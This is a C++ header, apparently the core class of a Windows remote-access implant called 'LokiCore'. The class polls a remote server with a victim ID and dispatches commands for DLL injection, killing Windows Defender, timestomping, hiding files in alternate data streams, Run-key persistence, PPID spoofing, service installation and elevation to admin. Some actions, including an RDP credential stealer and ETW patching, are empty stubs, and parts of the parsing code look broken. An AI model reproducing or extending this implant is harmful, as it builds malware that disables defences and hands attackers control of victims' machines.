#pragma once
#include <Windows.h>
#include <iostream>
#include <curl/curl.h>
#include <string>
#include <ntstatus.h>
#include <unordered_map>
#include "resource.h"
#include "httpRequest.h"
#include "IPC.h"
#include "NetSignature.h"
#include "TimeStomping.h"
#include "Utils.h"
#include "DLLInjection.h"
#include "WinDefKiller.h"
#include "FileHiderADS.h"
#include "Persistence.h"
#include "PEBManipulator.h"
#include "PPIDSpoofer.h"
#include "InstalAllService.h"
#include "CommandLineSpoofing.h"
#include "PrivilegeEscalation.h"


using namespace std;

class LokiCore{

	enum action {
		TimeStomping = 0,
		DLLInjection = 1,
		ListProcesses = 2,
		WinDefenderKiller = 3,
		HideFile = 4,
		UnhideFile = 5,
		Persistence = 6,
		CommandLineManipulation = 7,
		RDPCredStealer = 8,	
		PatchETW = 9,
		PPIDSpoofing = 10,
		InstallAsService = 11,
		CMDLineSpoofing = 12,
		ExecuteEXEAsAdmin = 13,
	};

	public:
		typedef LONG NTSTATUS;

        int init() {
			char fakeID[] = "0";
			IPC ipc = IPC();	
			ipc.storeStringADS(fakeID);
			string victimID = ipc.readStringADS();
			Utils utils = Utils();

			string lastAction = "-1";
            while (true) {
				string action = "";
				httpRequest http = httpRequest();
				string result = http.httpNewAction(victimID);

				action = result.substr(0, result.find(","));
				if (lastAction == result.substr(result.find(",") + 1, result.length())) {
					OutputDebugStringA("Same action as last time, skipping");
					SleepImplant(5000);
					continue;
				}
				lastAction = result.substr(result.find(",") + 1, result.length());
				int actionInt = stoi(action);

				string params = "";
				string srcFile;
				string dstFile;
				char srcFileChar[MAX_PATH];
				char dstFileChar[MAX_PATH];
				string dllPath = "";
				int pid;
				string processName;
				string adsName;
				string name;
				string exe;
				LPCWSTR nameLPCWSTR;
				string exeToExecute;
				string processToSpoof;
				string serviceName;
				string servicePath;
				TCHAR* serviceNameTCHAR;
				TCHAR* servicePathTCHAR;	
				wstring cmdValue;
				

				switch (actionInt) {
					
					case TimeStomping:
						TimeStompingClass timeStomper = TimeStompingClass();
						params = http.httpGetParamsAction(victimID, action);

						srcFile = params.substr(params.find("srcFile=") + 8, params.find(",") - 8);
						dstFile = params.substr(params.find("dstFile=") + 8, params.length() - 8);

						strcpy_s(srcFileChar, srcFile.c_str());
						strcpy_s(dstFileChar, dstFile.c_str());						

						timeStomper.copyStamps(srcFileChar, dstFileChar);
						break;

					case DLLInjection:
						params = http.httpGetParamsAction(victimID, action);
						processName = params.substr(params.find("process=") + 8, params.find(",") - 8);
						dllPath = params.substr(params.find("dllPath=") + 8, params.length() - 8);

						Utils utils = Utils();
						pid = utils.getPIDbyProcName("notepad.exe");

						DLLInjector dllInjector = DLLInjector();
						dllInjector.DLLinjector(pid, dllPath.c_str());
						break;

					case ListProcesses:
						// instructions for listing processes			
						break;

					case WinDefenderKiller:
						WinDefKiller winDefKiller = WinDefKiller();
						winDefKiller.killWinDefender();
						break;
					
					case HideFile:
						params = http.httpGetParamsAction(victimID, action);

						srcFile = params.substr(params.find("srcFile=") + 8, params.find(",") - 8);
						dstFile = params.substr(params.find("dstFile=") + 8, params.find(",") - 8);
						adsName = params.substr(params.find("adsName=") + 8, params.length() - 8);

						FileHider fileHider = FileHider();
						fileHider.hideFile(srcFile, dstFile, adsName);
						break;

					case UnhideFile:
						params = http.httpGetParamsAction(victimID, action);

						srcFile = params.substr(params.find("srcFile=") + 8, params.find(",") - 8);
						dstFile = params.substr(params.find("dstFile=") + 8, params.find(",") - 8);
						adsName = params.substr(params.find("adsName=") + 8, params.length() - 8);

						FileHider fileHider2 = FileHider();
						fileHider2.unHideFile(srcFile, dstFile, adsName);
						break;

					case Persistence:
						params = http.httpGetParamsAction(victimID, action);
						// exe=C:\Windows\System32\notepad.exe,name=notepad
						exe = params.substr(params.find("exe=") + 4, params.find(",") - 4);
						name = params.substr(params.find("name=") + 5, params.length() - 5);

						nameLPCWSTR = utils.convertStringToLPCWSTR(name);

						PersistenceClass persistence = PersistenceClass();
						persistence.persistenceViaRunKeys(exe.c_str(), nameLPCWSTR);
						
						break;

					case CommandLineManipulation:
						// instructions for command line manipulation
						break;

					case RDPCredStealer:
						// instructions for RDP credential stealer
						break;

					case PatchETW:
						// instructions for patching ETW
						break;

					case PPIDSpoofing:
						params = http.httpGetParamsAction(victimID, action);
						exeToExecute = params.substr(params.find("exeToExecute=") + 13, params.find(",") - 13);
						processToSpoof = params.substr(params.find("processToSpoof=") + 15, params.length() - 15);

						PPIDSpoofer pids = PPIDSpoofer();
						pid = utils.getPIDbyProcName(processToSpoof.c_str());
						pids.SpoofNewProcess(exeToExecute.c_str(), pid);
						break;

					case InstallAsService:
						// instructions for Install EXE as service
						params = http.httpGetParams(victimID, action);

						serviceName = params.substr(params.find("serviceName=") + 12, params.find(",") - 12);
						servicePath = params.substr(params.find("servicePath=") + 12, params.length() - 12);

						serviceNameTCHAR = (TCHAR*)serviceName.c_str();
						servicePathTCHAR = (TCHAR*)servicePath.c_str();

						Installer installer = Installer();
						installer.InstallService(serviceNameTCHAR, servicePathTCHAR);
						break;

					case CMDLineSpoofing:
						// 12
						break;

					case ExecuteEXEAsAdmin:
						params = http.httpGetParams(victimID, action);
						processName = params.substr(params.find("process=") + 8, params.length() - 8);
						PrivilegeEscalationClass privEsc = PrivilegeEscalationClass();

						wstring wideProcessName(processName.begin(), processName.end());
						const wchar_t* cmdValue = wideProcessName.c_str();
						privEsc.runProcAsAdminFromUser(cmdValue);
						break;




				}
                OutputDebugStringA(result.c_str());
                SleepImplant(5000);
            }

            return 0;
        }

	private:


		bool SleepImplant(DWORD dwMilliseconds) {
			HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
			if (hEvent == NULL) {
				return false;
			}
			HANDLE hTimer = NULL;
			LARGE_INTEGER liDueTime;
			liDueTime.QuadPart = -10000LL * dwMilliseconds;
			hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
			if (hTimer == NULL) {
				CloseHandle(hEvent);
				return false;
			}
			if (!SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, FALSE)) {
				CloseHandle(hEvent);
				CloseHandle(hTimer);
				return false;
			}
			if (WaitForSingleObject(hTimer, INFINITE) != WAIT_OBJECT_0) {
				CloseHandle(hEvent);
				CloseHandle(hTimer);
				return false;
			}
			CloseHandle(hEvent);
			CloseHandle(hTimer);
			return true;
		}

		static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
			size_t total_size = size * nmemb;
			output->append(static_cast<char*>(contents), total_size);
			return total_size;
		}

		BOOL InstallService(const TCHAR* serviceName, const TCHAR* servicePath) {
			SC_HANDLE schSCManager = NULL;
			SC_HANDLE schService = NULL;
			BOOL success = FALSE;

			schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
			if (schSCManager == NULL) {
				return false;
			}

			schService = CreateService(
				schSCManager,
				serviceName,
				serviceName,
				SERVICE_ALL_ACCESS,
				SERVICE_WIN32_OWN_PROCESS,
				SERVICE_AUTO_START,
				SERVICE_ERROR_NORMAL,
				servicePath,
				NULL,
				NULL,
				NULL,
				NULL,
				NULL
			);

			if (schService == NULL) {
				return false;
			}

			success = TRUE;

			if (schService != NULL) {
				CloseServiceHandle(schService);
			}

			if (schSCManager != NULL) {
				CloseServiceHandle(schSCManager);
			}

			return success;
		}
};